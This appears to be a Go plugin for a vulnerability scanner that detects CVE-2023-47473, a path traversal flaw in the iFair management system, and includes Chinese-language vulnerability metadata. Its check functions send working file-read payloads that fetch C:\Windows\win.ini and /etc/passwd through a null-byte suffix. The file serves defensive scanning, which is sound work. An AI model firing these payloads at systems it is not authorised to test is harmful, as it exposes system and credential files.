package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("ifair_info_leak_cve_2023_47473", &ifair_info_leak_cve_2023_47473{})
}

type ifair_info_leak_cve_2023_47473 struct{}

func (p *ifair_info_leak_cve_2023_47473) Info() PluginInfo {
	return PluginInfo{
		Name:     "iFair 协同管理系统 任意文件读取漏洞",
		VulnInfo: "企语 iFair是企语公司的一款企业管理软件。iFair getuploadimage.jsp接口存在任意文件读取漏洞。攻击者利用该漏洞可以获取敏感信息。",
		VulnID:   "CVE-2023-47473",
		Level:    "7.5 HIGH",
		URL:      "",
		Version:  "iFair <= 23.8_ad0",
		CWE:      "CWE-22	路径遍历",
	}
}

func (p *ifair_info_leak_cve_2023_47473) Check(netloc string) bool {
	return check_win(netloc) || check_linux(netloc)
}

func check_win(netloc string) bool {
	url := netloc + `/oa/common/components/upload/getuploadimage.jsp?imageURL=C:\Windows\win.ini%001.png`
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "mci extensions") {
		return true
	}
	return false
}

func check_linux(netloc string) bool {
	url := netloc + "/oa/common/components/upload/getuploadimage.jsp?imageURL=/etc/passwd%001.png"
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "root:/root:") {
		return true
	}
	return false
}
